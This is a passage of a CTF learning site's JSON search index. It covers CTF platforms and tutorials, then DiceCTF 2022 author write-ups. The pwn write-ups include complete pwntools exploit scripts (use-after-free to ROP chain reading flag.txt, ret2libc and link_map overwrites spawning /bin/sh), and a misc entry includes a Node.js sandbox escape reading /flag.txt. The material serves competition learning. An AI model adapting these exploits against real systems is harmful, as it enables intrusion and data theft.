events. Along with the events schedule and team page, writeups are also collected by CTF time. Find writeups for the event by clicking corresponding event page and find Event tasks and writeups page. Find upcoming CTF events using CTF time.","title":"ctftime"},{"location":"Website/Platform/ctftime/#reference","text":"CTF time link: https://ctftime.org/","title":"Reference"},{"location":"Website/Platform/ichunqiu/","text":"ichunqiu ichunqiu's platform is a good place to find upcoming events. This platform is based on the competitions and the solutions to the competitions. It doesn't provide any online challenge environment, but it provides almost all the Chinese CTF events schedule. Reference Link: https://www.ichunqiu.com/competition","title":"ichunqiu"},{"location":"Website/Platform/ichunqiu/#ichunqiu","text":"ichunqiu's platform is a good place to find upcoming events. This platform is based on the competitions and the solutions to the competitions. It doesn't provide any online challenge environment, but it provides almost all the Chinese CTF events schedule.","title":"ichunqiu"},{"location":"Website/Platform/ichunqiu/#reference","text":"Link: https://www.ichunqiu.com/competition","title":"Reference"},{"location":"Website/Platform/picoCTF/","text":"picoCTF picoCTF is a series of CTFs focus on the high school students. Nowadays, picoCTF adds more difficult challenges that face to all gamers besides high school students. The picoCTF platform provides most of the challenges in picoCTF these years and you can try to solve those challenges online. The challenges are from very easy to advanced. Some beginner challenges are friendly for CTF beginners and some advanced challenges may take you some time to solve. The binary challenges are hard for beginners and picoCTF doesn't provide beginner-friendly binary (pwn) challenges. For those who are starting their travel in binary field, maybe other platform is better than picoCTF. Reference Link: https://play.picoctf.org/practice","title":"picoCTF"},{"location":"Website/Platform/picoCTF/#picoctf","text":"picoCTF is a series of CTFs focus on the high school students. Nowadays, picoCTF adds more difficult challenges that face to all gamers besides high school students. The picoCTF platform provides most of the challenges in picoCTF these years and you can try to solve those challenges online. The challenges are from very easy to advanced. Some beginner challenges are friendly for CTF beginners and some advanced challenges may take you some time to solve. The binary challenges are hard for beginners and picoCTF doesn't provide beginner-friendly binary (pwn) challenges. For those who are starting their travel in binary field, maybe other platform is better than picoCTF.","title":"picoCTF"},{"location":"Website/Platform/picoCTF/#reference","text":"Link: https://play.picoctf.org/practice","title":"Reference"},{"location":"Website/Platform/pwnabletw/","text":"pwnable.tw A series of binary exploitation (pwn) problems and you may try to solve them online. The quantity of challenges isn't much, but the quality is pretty good. Reference Link: https://pwnable.tw/challenge/","title":"pwnable.tw"},{"location":"Website/Platform/pwnabletw/#pwnabletw","text":"A series of binary exploitation (pwn) problems and you may try to solve them online. The quantity of challenges isn't much, but the quality is pretty good.","title":"pwnable.tw"},{"location":"Website/Platform/pwnabletw/#reference","text":"Link: https://pwnable.tw/challenge/","title":"Reference"},{"location":"Website/Tutorial/CTF%20Field%20Guide/","text":"CTF Field Guide In these chapters, you\u2019ll find everything you need to win your next CTF competition: Walkthroughs and details on past CTF challenges Guidance to help you design and create your own toolkits Case studies of attacker behavior, both in the real world and in past CTF competitions Consists of several introduction to each categories. Reference Link: https://trailofbits.github.io/ctf/","title":"CTF Field Guide"},{"location":"Website/Tutorial/CTF%20Field%20Guide/#ctf-field-guide","text":"In these chapters, you\u2019ll find everything you need to win your next CTF competition: Walkthroughs and details on past CTF challenges Guidance to help you design and create your own toolkits Case studies of attacker behavior, both in the real world and in past CTF competitions Consists of several introduction to each categories.","title":"CTF Field Guide"},{"location":"Website/Tutorial/CTF%20Field%20Guide/#reference","text":"Link: https://trailofbits.github.io/ctf/","title":"Reference"},{"location":"Website/Tutorial/CTF%20Wiki/","text":"CTF Wiki As a freedom site, primarily focusing on recent CTFs, CTF Wiki introduces the knowledge and techniques in all aspects of CTF to make it easier for beginners to learn CTF . Now, CTF Wiki mainly contains the basic skills for CTF , but we are working hard to improve the following contents. Advanced skills used in CTF Special topics appearing in CTF For the above-mentioned parts to be improved, please refer to Projects which details what are planned. Although now CTF Wiki mainly focus CTF , it is not strictly limited to CTF topics. In the future, CTF Wiki will include Tools used in security research Increased discussion of security in the world In addition, given the following two points Information about technology should be openly shared. As new techniques are always being developed, old techniques will start to fade over time and they should be replaced with new techniques. Therefore, CTF Wiki will never publish books. Finally, originating from the community, as an independent organization, CTF Wiki advocates freedom of knowledge , will never be commercialized , and will always maintain the character of independence and freedom . Reference Link: https://ctf-wiki.org/","title":"CTF Wiki"},{"location":"Website/Tutorial/CTF%20Wiki/#ctf-wiki","text":"As a freedom site, primarily focusing on recent CTFs, CTF Wiki introduces the knowledge and techniques in all aspects of CTF to make it easier for beginners to learn CTF . Now, CTF Wiki mainly contains the basic skills for CTF , but we are working hard to improve the following contents. Advanced skills used in CTF Special topics appearing in CTF For the above-mentioned parts to be improved, please refer to Projects which details what are planned. Although now CTF Wiki mainly focus CTF , it is not strictly limited to CTF topics. In the future, CTF Wiki will include Tools used in security research Increased discussion of security in the world In addition, given the following two points Information about technology should be openly shared. As new techniques are always being developed, old techniques will start to fade over time and they should be replaced with new techniques. Therefore, CTF Wiki will never publish books. Finally, originating from the community, as an independent organization, CTF Wiki advocates freedom of knowledge , will never be commercialized , and will always maintain the character of independence and freedom .","title":"CTF Wiki"},{"location":"Website/Tutorial/CTF%20Wiki/#reference","text":"Link: https://ctf-wiki.org/","title":"Reference"},{"location":"Website/Tutorial/HackTricks/","text":"HackTricks Welcome to the page where you will find each hacking trick/technique/whatever I have learnt in CTFs, real life apps, and reading researches and news. HackTricks contains learning methods of CTF and recently news about cybersecurity. Reference Link: https://book.hacktricks.xyz/","title":"HackTricks"},{"location":"Website/Tutorial/HackTricks/#hacktricks","text":"Welcome to the page where you will find each hacking trick/technique/whatever I have learnt in CTFs, real life apps, and reading researches and news. HackTricks contains learning methods of CTF and recently news about cybersecurity.","title":"HackTricks"},{"location":"Website/Tutorial/HackTricks/#reference","text":"Link: https://book.hacktricks.xyz/","title":"Reference"},{"location":"Website/Tutorial/ctf101/","text":"Capture The Flag 101 Capture The Flags, or CTFs, are a kind of computer security competition. Teams of competitors (or just individuals) are pitted against each other in a test of computer security skill. Very often CTFs are the beginning of one's cyber security career due to their team building nature and competitive aspect. In addition, there isn't a lot of commitment required beyond a weekend. In this guide/wiki/handbook you'll learn the techniques, thought processes, and methodologies you need to succeed in Capture the Flag competitions. CTF 101 is the perfect website for CTF beginners. Reference Link: https://ctf101.org/","title":"Capture The Flag 101"},{"location":"Website/Tutorial/ctf101/#capture-the-flag-101","text":"Capture The Flags, or CTFs, are a kind of computer security competition. Teams of competitors (or just individuals) are pitted against each other in a test of computer security skill. Very often CTFs are the beginning of one's cyber security career due to their team building nature and competitive aspect. In addition, there isn't a lot of commitment required beyond a weekend. In this guide/wiki/handbook you'll learn the techniques, thought processes, and methodologies you need to succeed in Capture the Flag competitions. CTF 101 is the perfect website for CTF beginners.","title":"Capture The Flag 101"},{"location":"Website/Tutorial/ctf101/#reference","text":"Link: https://ctf101.org/","title":"Reference"},{"location":"Website/Tutorial/how%20to%20become%20a%20hacker/","text":"How To Become A Hacker An article of \"how to\" series written by Eric Steven Raymond. In this article, you can learn how to become a hacker, and what should you learn to contribute to the cybersecurity and hacking field. Remember the hacker attitudes: The world is full of fascinating problems waiting to be solved. No problem should ever have to be solved twice. Boredom and drudgery are evil. Freedom is good. Attitude is no substitute for competence. Reference Link: http://www.catb.org/~esr/faqs/hacker-howto.html","title":"How To Become A Hacker"},{"location":"Website/Tutorial/how%20to%20become%20a%20hacker/#how-to-become-a-hacker","text":"An article of \"how to\" series written by Eric Steven Raymond. In this article, you can learn how to become a hacker, and what should you learn to contribute to the cybersecurity and hacking field. Remember the hacker attitudes: The world is full of fascinating problems waiting to be solved. No problem should ever have to be solved twice. Boredom and drudgery are evil. Freedom is good. Attitude is no substitute for competence.","title":"How To Become A Hacker"},{"location":"Website/Tutorial/how%20to%20become%20a%20hacker/#reference","text":"Link: http://www.catb.org/~esr/faqs/hacker-howto.html","title":"Reference"},{"location":"Website/Tutorial/linux/","text":"Linux Tools Quick Tutorial A website for linux beginners to learn with linux command and tools. This website is only a brief introduction to the linux. After learning the tutorial of linux, you can use linux just like using any other operating systems. If you want to find more details of Linux instead of just learning of features and tutorials to usage, you may want to read \u300a\u9e1f\u54e5\u7684Linux\u79c1\u623f\u83dc\u300b. The reference to the blog is attached below this tutorial. Reference Link: https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/index.html \u9e1f\u54e5\u7684Linux\u79c1\u623f\u83dc: http://linux.vbird.org/","title":"Linux Tools Quick Tutorial"},{"location":"Website/Tutorial/linux/#linux-tools-quick-tutorial","text":"A website for linux beginners to learn with linux command and tools. This website is only a brief introduction to the linux. After learning the tutorial of linux, you can use linux just like using any other operating systems. If you want to find more details of Linux instead of just learning of features and tutorials to usage, you may want to read \u300a\u9e1f\u54e5\u7684Linux\u79c1\u623f\u83dc\u300b. The reference to the blog is attached below this tutorial.","title":"Linux Tools Quick Tutorial"},{"location":"Website/Tutorial/linux/#reference","text":"Link: https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/index.html \u9e1f\u54e5\u7684Linux\u79c1\u623f\u83dc: http://linux.vbird.org/","title":"Reference"},{"location":"Website/Tutorial/python/","text":"Python Yet an introduction of Python3. if you want to learn Python2, you can find Python2 version of this doc in Python document. Reference Link: http://www.pythondoc.com/pythontutorial3/index.html","title":"Python"},{"location":"Website/Tutorial/python/#python","text":"Yet an introduction of Python3. if you want to learn Python2, you can find Python2 version of this doc in Python document.","title":"Python"},{"location":"Website/Tutorial/python/#reference","text":"Link: http://www.pythondoc.com/pythontutorial3/index.html","title":"Reference"},{"location":"Writeup/","text":"Writeups Writeups are solutions to the CTF challenges. Each writeup contains several components: Challenge description and attachments of challenge. Analysis of the challenge. Make a brief introduction to the idea of solution. Steps to solve the question and the example code of the exploit. Result from the challenge output. References and related websites the attack methods and methodology of the exploit. Some writeups are from cooperators of our team and website. Usage of the writeups Here are some ideas that may help you to use the writeups. First of all, if writeup's idea of solving challenge doesn't clear enough, feel free to add more content to the writeup. Some additional steps are also fine. You can use the methodology of writeup to solve the challenge, but don't forget to read about the ideas and references of attack after the solution . Please don't simple copy the flag and submit it to the judger. Sometimes the flag is dynamic and every time you request the challenge it would change. If you submit a out dated flag or others flag, your account may be banned . Only watch writeup if you can not find any method to solve the challenge. Enjoy your trip!","title":"Writeups"},{"location":"Writeup/#writeups","text":"Writeups are solutions to the CTF challenges. Each writeup contains several components: Challenge description and attachments of challenge. Analysis of the challenge. Make a brief introduction to the idea of solution. Steps to solve the question and the example code of the exploit. Result from the challenge output. References and related websites the attack methods and methodology of the exploit. Some writeups are from cooperators of our team and website.","title":"Writeups"},{"location":"Writeup/#usage-of-the-writeups","text":"Here are some ideas that may help you to use the writeups. First of all, if writeup's idea of solving challenge doesn't clear enough, feel free to add more content to the writeup. Some additional steps are also fine. You can use the methodology of writeup to solve the challenge, but don't forget to read about the ideas and references of attack after the solution . Please don't simple copy the flag and submit it to the judger. Sometimes the flag is dynamic and every time you request the challenge it would change. If you submit a out dated flag or others flag, your account may be banned . Only watch writeup if you can not find any method to solve the challenge. Enjoy your trip!","title":"Usage of the writeups"},{"location":"Writeup/DiceCTF%202022/","text":"DiceCTF 2022 Author Writeups by ireland / DiceGang Crypto Challenge name Author Writeup crypto/baby-rsa ireland jump crypto/rejected ireland jump crypto/correlated ireland jump crypto/commitment-issues gripingberry jump crypto/pow-pow defund link crypto/learning without errors ireland jump crypto/shibari ireland jump crypto/psych defund link Misc Challenge name Author Writeup misc/undefined aplet123 jump misc/sober-bishop clubby789 jump misc/Vinegar kmh TODO misc/TI-1337 Silver Edition kmh TODO misc/Cache On The Side wiresboy TODO misc/5D File System with Multiverse Time Travel poortho TODO Pwn Challenge name Author Writeup pwn/interview-opportunity smoothhacker jump pwn/baby-rop ireland jump pwn/data-eater KyleForkBomb jump pwn/chutes-and-ladders bosh TODO pwn/containment hgarrereyn TODO pwn/memory hole chop0 TODO pwn/nightmare pepsipu jump pwn/road-to-failure NotDeGhost jump Rev Challenge name Author Writeup rev/flagle infuzion TODO rev/hyperlink BrownieInMotion TODO rev/taxes hgarrereyn TODO rev/dicecraft hgarrereyn TODO rev/cable management evilmuffinha TODO rev/typed aplet123 jump rev/breach hgarrereyn TODO rev/universal ireland jump ] Web Challenge name Author Writeup web/knock-knock BrownieInMotion jump web/blazingfast larry link web/no-cookies BrownieInMotion TODO web/flare larry TODO web/vm-calc Strellic link web/noteKeeper Strellic link web/dicevault arxenix jump web/denoblog Strellic link web/carrot larry TODO web/shadow arxenix jump Writeups crypto/baby-rsa 256-bit RSA where $e^2 | p-1, q-1$. Intended solution = factor $N$ with cado-nfs, then use sage's nth_root() function to get all candidate decryptions. Finally, combine using Chinese Remainder Theorem. The nth_root() algorithm is described in this paper . It's simple for $e | p-1$, but for higher-powers of $e$ involves solving a (small) discrete logarithm problem. Fortunately, sage has it implemented as a built-in. Many resources online describe how to proceed if e | p-1 , but they don't describe the general case for higher powers of e . from Crypto.Util.number import long_to_bytes N = 57996511214023134147551927572747727074259762800050285360155793732008227782157 e = 17 cipher = 19441066986971115501070184268860318480501957407683654861466353590162062492971 # factor with cado-nfs p, q = 172036442175296373253148927105725488217, 337117592532677714973555912658569668821 assert p * q == N p_roots = mod(cipher, p).nth_root(e, all=True) q_roots = mod(cipher, q).nth_root(e, all=True) for xp in p_roots: for xq in q_roots: x = crt([Integer(xp), Integer(xq)], [p,q]) x = int(x) flag = long_to_bytes(x) if flag.startswith(b\"dice\"): print(flag.decode()) crypto/rejected Whenever the RNG has to reroll, then it means that the highest bit of the output is 1 . This lets you launch a known-plaintext attack on the underlying LFSR. Solve the resulting linear system (over GF(2) ) and find the flag. You don't really get much information if the RNG doesn't reroll. A good choice of modulus is (2^32 // 3) + 1 or (2^32 // 4) + 1 , as this will increase the chances of the RNG rerolling. crypto/correlated A correlation attack on a LFSR, this challenge artificially demonstrates how you can attack a filtered LFSR. If you have 48 (= length of seed) clean bits, then you can invert the LFSR stream and find the seed. As each bit in the output stream is correct with 80% probability, you should expect to try 1 / 0.8^48 = 45,000 different subsets of the output stream before it works. As you are given 20,000 output bits, this is no problem at all. Unmodified information set decoding also works, mainly because the dimension of the LFSR is so small. You can also solve this with a customized fast correlation attack if you find sparse linear relations for the LFSR. As the state space is 2^48, you can use a birthday attack/meet-in-the-middle to find random linear relations each of length 3 which collide. That will give you a length 6 linear relation for the LFSR. This is much more complicated than the other solutions. crypto/commitment-issues We are given the result of a commitment of a signature of the flag. In particular, we have a large semiprime $N = pq$, a public exponenent $e$ with inverse $d$, and if m = bytes_to_long(flag) , then $s = m^d \\pmod{N}$ is the signature. A random value $r$ is then generated and we're given $c_1 = s + r \\pmod{N}$ and $c_2 = r^5 \\pmod{N}$. There's multiple ways to ultimately do the same computations that lead to the flag. I'll describe a solution that's due to Utaha from Balsn. Notice that the polynomial $p(t) = (c_1 - t)^5 - c_2 \\in \\mathbb{Z} N[t]$ vanishes at $t = s$. We then consider the quotient ring $\\mathbb{Z}_N[t]/(p)$. Since the lead coefficient of $p$ is a unit, this is a free $\\mathbb{Z}_N$-module of rank $\\deg p = 5$ with basis ${1, t, ..., t^4}$. In particular any $6$ elements in $\\mathbb{Z}_N[t]/(p)$ will satisfy a non-trivial $\\mathbb{Z}_N$-linear dependence. Using sage to efficiently write $$(t^e)^i = a {i0} + a_{i1}t + \\dots + a_{i4}t^4 \\in \\mathbb{Z} N[t]/(p)$$ for $i = 0, ..., 5$ we can use the matrix $A = (a {ij})_{ij}$ to compute a non-trivial linear dependence $$\\beta_0 + \\beta_1 \\cdot t^e + \\dots + \\beta_5 \\cdot (t^e)^5 = 0 \\in \\mathbb{Z}_N[t]/(p).$$ However since $p(s) = 0 \\pmod{N}$, the evaluation at $s$ map $$\\begin{aligned} E_s :\\;& \\mathbb{Z}_N[t] \\to \\mathbb{Z}_N \\ & \\;\\;\\;\\; q \\longmapsto q(s) \\end{aligned}$$ descends to a valid map $\\mathbb{Z}_N[t]/(p)\\to \\mathbb{Z}_N$ and we find that in fact, $$\\beta_0 + \\beta_1 \\cdot s^e + \\dots + \\beta_5 \\cdot (s^e)^5 = 0 \\pmod{N}.$$ But $s^e = m$ is just the flag, and we can now apply Coppersmith to recover $m$. crypto/learning-without-errors This challenge is based on a passive attack which broke the CKKS cryptosystem last year . The gist of it is that CKKS Ring Learning With Errors cryptosystem encrypts the message as a pair (c_0, c_1) = (a, a * s + m + e) where s is the secret, m is the message, a is a random ring element, and e is a \"small\" secret error. If e and s are unknown, then recovering m from this requires solving a hard lattice problem. However, when decrypting, CKKS returns m + e , which just ... tells you ... what the secret error is. Basic algebra then gives s = (c_1 - (m + e)) * c_0^{-1} . Therefore, seeing a pair of encrypted and decrypted values is enough for a passive adversary to completely recover the secret key! However, this does seemingly require c_0 to be invertible in the ring, which for our parameters is Zmod(2^100)[x] / [x^1024] . The power-of-two modulus does (or so I thought) raise an issue. q = 1 << 100 N = 10 Rbase.<x> = PolynomialRing(Zmod(q)) R.<x> = Rbase.quotient(x^N + 1) Based on my testing, I had assumed that with overwhelming probability, c_0 would not have an inverse in the ring. This would force competitors to find another way to compute the required division. This appears to be supported by the linked paper (on page 18): A little difficulty arises due to the choice of q. The first implementation of CKKS, the HEAAN library sets q to a power of 2 to simplify the treatment of floating point numbers. Subsequent instantiations of CKKS use a prime (or square-free) q of the form h \u00b7 2^n + 1 together with the Number Theoretic Transform for very fast ring operations. For a (sufficiently large) prime q, the probability of a random element a being invertible is very close to 1, but this is not the case when q is a power of two. If a is not invertible, we can still recover partial information about the secret key s, and completely recover s by using multiple ciphertexts. My solution computes the inverse of c_0 in the p-adic extension to R with 20480 digits of precision. (Such extremely high precision is needed because the quotient polynomial I = x^1024 + 1 has I.discriminant() = 2^10240 ). However, some teams just... got lucky... and had a c_0 which was invertible. I'm not sure what the chances of this happening were -- clearly my initial tests led me to the wrong conclusion. The challenge still had a low number of solves, probably because RLWE is not common in CTFs. crypto/shibari This challenge implements a very weird compiler using a representation of the Braid Group . Braid Groups have previously been used in cryptography to implement a non-commutative variant of Diffie-Hellman. This was also the concept behind the proposed post-quantum (but actually completely insecure) scheme WalnutDSA . The cryptographically-interesting property of Braid Groups is that they have a computationally efficient normal form. That is, while there are (infinitely) many ways to write an element of the braid group in terms of the generators, you can convert all representations into the same canonical form. This has been proposed as a way to hide the individual factors of a product of group elements a * b * c . This challenge used the fact that the group-action of the braid group with $n$ strands on $AlternatingGroup(5)^{(2 n)}$ induced by the Yang-Baxter equation is sufficiently expressive that it is Turing complete. Specifically, you can evaluate CCNOT gates, which are computationally universal. The bulk of the source code provided for this challenge consists of a circuit-to-braid compiler and a braid-circuit evaluator. Additionally, I provided python bindings for a very fast braid group library, which can compute the canonical forms for the braids. I also presented a C++ version of the braid-circuit evaluator, which takes around 0.1 seconds to evaluate each sub-circuit. With all this done, we can finally discuss the challenge. The intended solution is 2 parts: 1) the braid is already in normal form, so you can import it into LNF faster than computing LNF on it. 2) apply a length-based attack because the entire circuit is reversible. if you guess that the first few gates are performing the subcircuit A := NOT bit 0; CCNOT(0,1,2) then the length of the circuit A^-1 * Circuit should be \"shorter\" than the length of Circuit , where length is the length of the LNF canonical form Whereas if you guess wrong and try the circuit B := NOT bit 0; NOT bit 1; CCNOT(0,1,2) , then the length of the circuit B^-1 * Circuit should be longer than the length of Circuit . So you can bruteforce the flag 2-bits at a time the step 1) of importing into LNF is needed because computing the LNF is so slow for the obfuscated braids (it's pretty quick for the unobfuscated braids). And the provided python bindings support quickly computing the LNF of LNF(a) * LNF(b) In hindsight, I should have released the LNF form of the braids so that players didn't have to import it. The only solution during the competition to this challenge used GPU brute force to find the flag \\shrug. I estimate that this took the equivalent of 10-years of cpu time. This was completely unintended. misc/undefined Node.js wraps modules in a top-level function where require is passed in as an argument, meaning that require will always be accessible from arguments . However, since arguments is shadowed, you have to first create a function then access the parent function's arguments via arguments.callee.caller.arguments : (function(){return arguments.callee.caller.arguments[1](\"fs\").readFileSync(\"/flag.txt\", \"utf8\")})() For some reason, when making the challenge, I thought import wouldn't work due to Node defaulting to common.js modules, but it does for some reason, so there's a much easier cheese: import(\"fs\").then(m=>console.log(m.readFileSync(\"/flag.txt\", \"utf8\"))) misc/sober-bishop To solve the challenge, players must find a flag which can be passed into OpenSSH's randomart algorithm. Due to the high-collision nature of the function, randomart(md5(flag)) is also provided. We need to implement a high-performance algorithm to identify valid paths through the grid. My approach was this: 1. Starting at our inital point, try moving to a diagonally adjacent position 2. Append the new position to a list of positions 3. Check if the number of times the current position appears in the list exceeds the number of times indicated by the grid - If we are at the end position, go to step 5 - If it does not exceed, then try moving to a new position - If it does, then pop the current position off the list 4. Repeat steps 1-3 on the next of the four possible positions 5. Convert the list of coordinates to a series of two-bit pairs, and convert them to a byte array 6. Check if the randomart(md5(array)) matches the provided randomart - If not, return to step 3 - If so, we're done, and print our flag To optimise this approach: - For the initial 4 positions, we can split the work across multiple cores easily, each exploring potential paths - We know the start position, and the first 5 characters ( dice{ ). Therefore we can hardcode the first 21 positions - At each position, we can convert our path to a string and check if it meets the constraints (begins with dice{ , all lowercase alphanumeric). If not, we can backtrack - If we have a 'complete' flag dice{[a-z0-9]+} , we can verify that each position has been visited the correct number of times - If all this is the case, we can attempt to calculate the MD5 My Rust solution took 20 seconds to extract the flag dice{unr4nd0m} pwn/baby-rop The challenge is a simple use-after-free, but with a few mitigations to make exploitation harder. Because the challenge uses a struct with a char * , players can easily turn the use-after-free into an arbitrary read and write without specialized heap voodoo. PIE is disabled because I'm nice. The challenge has several mitigations. 1) the glibc version is 2.34 (as printed out 3 different times when you connect to the server), which removed the __free_hook and __malloc_hook flags 2) full RELRO is used, which removes another collection of function pointers to overwrite 3) the binary uses seccomp to ban the execve syscall. So both calling a one-gadget and calling system(\"/bin/sh\") are off the table. 4) ASLR (but not PIE) is enabled, so the location of the stack is randomized. As the challenge name indicates, you are supposed to ROP your way to the flag, using an open-read-write ROP chain. So now the question is -- how can you turn your arbitrary read/write into a ROP chain? First, you'll need to leak a stack address. A nice description of how to leverage arbitrary reads in the binary/libc/heap/stack to determine the location of everything else can be found in this blog post . Note: these techniques were also heavily featured in the breach and containment challenges! The crucial section is that libc contains an environ pointer which points to a location on the stack. The sequence is: 1) read GOT to leak a libc address 2) read libc->environ to leak a stack address 3) compute the offset to the saved return addresses 4) ROP your way to the flag! Some teams had solutions which worked locally but not on remote. Some common fixed to these problems were: 1) use a write syscall instead of puts() to print the flag 2) double-check that the offset between *environ and the saved return address is correct on remote (should be -0x140 ). This has some slight variation depending on your configuration, but it's not hard to brute-force and check whether you're correct 3) using .bss as temporary storage instead of the heap. For whatever reason, exploits which tried to read the contents of flag.txt onto the heap were unreliable 4) open flag.txt in read-only mode. The redpwn jail we were using didn't support writing to disk 5) end your rop chain with an exit(0) syscall, which has the side-effect of flushing stdout My exploit is the following from pwn import * def split_before(s, t): i = s.index(t) return s[:i] def split_after(s, t): i = s.index(t) return s[len(t) + i:] ################################################# context.terminal = [\"tmux\", \"splitw\", \"-h\"] context.arch = 'amd64' context.binary = \"./run\" host = args.HOST or 'localhost' port = args.PORT or 31245 if args.LOCAL: r = process(\"./run\", env = {'LD_PRELOAD' : './libc.so.6'}) else: r = remote(host, port) binary = ELF(\"./run\") libc = ELF(\"./libc.so.6\") malloc_libc_OFFSET = libc.symbols[\"malloc\"] free_libc_OFFSET = libc.symbols[\"free\"] ################################################# def xfree(idx): print(r.recvuntil(b\"enter your command: \").decode()) r.sendline(b\"F\") print(r.recvuntil(b\"enter your index: \").decode()) r.sendline(\"{}\".format(idx).encode()) def xread(idx): print(r.recvuntil(b\"enter your command: \").decode()) r.sendline(b\"R\") print(r.recvuntil(b\"enter your index: \").decode()) r.sendline(\"{}\".format(idx).encode()) def xwrite(idx, value=b\"\"): print(r.recvuntil(b\"enter your command: \").decode()) r.sendline(b\"W\") print(r.recvuntil(b\"enter your index: \").decode()) r.sendline(\"{}\".format(idx).encode()) print(r.recvuntil(b\"enter your string: \").decode()) r.sendline(value) def xcreate(idx, length, value=b\"\"): print(r.recvuntil(b\"enter your command: \").decode()) r.sendline(b\"C\") print(r.recvuntil(b\"enter your index: \").decode()) r.sendline(\"{}\".format(idx).encode()) print(r.recvuntil(b\"How long is your safe_string: \").decode()) r.sendline(\"{}\".format(length).encode()) print(r.recvuntil(b\"enter your string: \").decode()) r.sendline(value) ################################################# xcreate(0, 128) xcreate(1, 128) xfree(0) xfree(1) got_free_addr = binary.symbols['got.free'] payload = p64(8) + p64(got_free_addr) xcreate(2, 16, payload) xread(0) print(r.recvuntil(b\"hex-encoded bytes\\n\").decode()) s = r.readline() s = s.decode() s = s.replace(\" \", \"\") s = bytes.fromhex(s) free_addr = u64(s) libc_base_addr = free_addr - free_libc_OFFSET # ------------------------------------------------- got_malloc_addr = binary.symbols['got.malloc'] payload = p64(8) + p64(got_malloc_addr) xwrite(2, payload) xread(0) print(r.recvuntil(b\"hex-encoded bytes\\n\").decode()) s = r.readline() s = s.decode() s = s.replace(\" \", \"\") s = bytes.fromhex(s) malloc_addr = u64(s) assert malloc_libc_OFFSET - free_libc_OFFSET == malloc_addr - free_addr # ------------------------------------------------- libc_environ_addr = libc_base_addr + libc.symbols[\"environ\"] payload = p64(8) + p64(libc_environ_addr) xwrite(2, payload) xread(0) print(r.recvuntil(b\"hex-encoded bytes\\n\").decode()) s = r.readline() s = s.decode() s = s.replace(\" \", \"\") s = bytes.fromhex(s) environ_addr = u64(s) print(hex(libc_environ_addr)) print(hex(environ_addr)) # ------------------------------------------------- libc.address = libc_base_addr rop = ROP(libc) # find offset with gdb, might need some brute-force for remote rip_addr = environ_addr - 0x140 # new file descriptor, totally brute-forcible fd = 3 # pointer to filename = \"flag.txt\" dst_filename = binary.bss(400) mov_rcx_rdx_addr = libc_base_addr + 0x0016c020 # 2.34 mov_rcx_rdx = p64(mov_rcx_rdx_addr) print(disasm(libc.read(mov_rcx_rdx_addr, 4))) rop(rcx=dst_filename, rdx=u64(b\"flag.txt\")) rop.raw(mov_rcx_rdx) rop(rcx=dst_filename + 8, rdx=0) rop.raw(mov_rcx_rdx) # sanity checks rop.puts(dst_filename) rop.write(1, dst_filename, 16, 1) rop.open(dst_filename, 0) rop.read(fd, dst_filename, 128) rop.write(1, dst_filename, 128) rop.exit(0) # ------------------------------------------------- real_payload = rop.chain() payload = p64(len(real_payload)) + p64(rip_addr) xwrite(2, payload) xwrite(0, real_payload) # gdb.attach(r) r.sendline(b\"E0\") sleep(0.1) print(r.recv()) pwn/data-eater There's usually a pointer to link_map on the stack somewhere, so just write some data to buf and overwrite the DT_STRTAB pointer in link_map->l_info . The offset to link_map varies a little bit but this should cover most of the possibilities. def sice(k): print(k) try: # do pwning r = conn() r.sendline(f'%s%{k}$s') r.sendline(b'/bin/sh\\0' + p64(exe.sym['buf'] + 16 - exe.section('.dynstr').index(b'memset\\x00')) + b'system\\0 ' + p64(0)*13 + p64(exe.sym['buf'])[:-1]) # make sure we got a shell r.recv(timeout=0.1) r.sendline('echo ginkoid') r.recvuntil('ginkoid') r.interactive() return True except EOFError: return False finally: r.close() for k in range(30, 50): if sice(k): break I recently found this doesn't work with ubuntu:18.04 and centos:6 for some reason, but the 14 other Docker images I tried were okay. Apologies if this caused you trouble! I initially only tested on a couple (including my own host) and it worked on all of them so I didn't bother trying more. pwn/interview-opportunity This challenge is a classic return2libc exploit. The bug here is 60 byte overflow into the 10 byte reason char array from the read() function call. ... int main(int argc, char **argv) { char reason[10]; ... read(0, reason, 70); puts(reason); } The only mitigations that are enabled are NX and ASLR. With NX enabled, we can't use shellcode. So ROP and ret2libc is our workaround. To defeat ASLR we have to do 2 passes. 1) leak the libc base address and return to main. 2) return to system() in libc. I have attached the solution script below. from pwn import * e = ELF(\"./interview-opportunity\") libc = ELF(\"./libc.so.6\") target = process(e.path) context.terminal = [\"tmux\", \"splitw\", \"-v\"] rdi = 0x401313 payload = b\"A\" * 0x22 payload += p64(rdi) payload += p64(e.got[\"puts\"]) payload += p64(e.symbols[\"puts\"]) payload += p64(e.symbols[\"main\"]) target.sendline(payload) target.recvuntil(b\"A\" * 0x22) target.recvline() leak = u64(target.recvline(keepends=False).ljust(8, b\"\\x00\")) - libc.symbols[\"puts\"] print(\"leak: {:#x}\".format(leak)) payload = b\"A\"*0x22 payload += p64(rdi + 1) payload += p64(rdi) payload += p64(next(libc.search(b\"/bin/sh\")) + leak) payload += p64(libc.symbols[\"system\"] + leak) target.sendline(payload) target.interactive() pwn/nightmare REDACTED: We are redacting the solution for 1 week to give teams an attempt to claim the blood prize! The author writeup will be released after the first solve or the 1 week is up. pwn/road-to-failure REDACTED: We are redacting the solution for 1 week to give teams an attempt to claim the blood prize! The author writeup will be released after the first solve or the1 week is up. rev/universal This challenge presents an obfuscate quantum circuit for performing addition based on the Quantum Fourier Transform adder , which is the same addition algorithm featured in the linked writeups from last year's quantum rev challenges. The goal is to determine that number is being added. The obfuscation comes from that all of the Rz(theta) rotations have been converted into long sequences of H and T gates -- thus making the entire quantum circuit only use H, T, CNOT gates. The program I used for this was gridsynth , which is much more efficient than other approaches, eg as given by the construction of the Solovay-Kitaev theorem. No other obfuscations were applied, apart from those required to convert controlled-rotations into a mix of CNOT and single-qubit gates. $ gridsynth pi/128 SHTHTHTHTHTHTHTSHTHTHTHTSHTHTHTHTHTSHTSHTHTHTHTHTSHTHTHTSHTSHTHTSHTSHTSHTHTHTHTS HTHTHTHTHTSHTSHTHTSHTHTSHTSHTSHTSHTHTSHTSHTSHTSHTHTHTSHTSHTSHTHTHTHTSHTHTSHTHTHT SHTHTHTHTSHTHTSHTHTSHTSHTSHTHTHTHTHTHTHTSHTHTSHTHTHTSHTSHTHTHTSHTSHTSHTHTSHTHTHT HTSHTSHTSHSSSWWWWWWW The intended solution analyzes the structure of the QFT to isolate where the actual rotations are beign applied. The QFT consists of a long chain of CNOT gates and Rz rotations. The actual adder component consists of only Rz rotations, with no CNOT 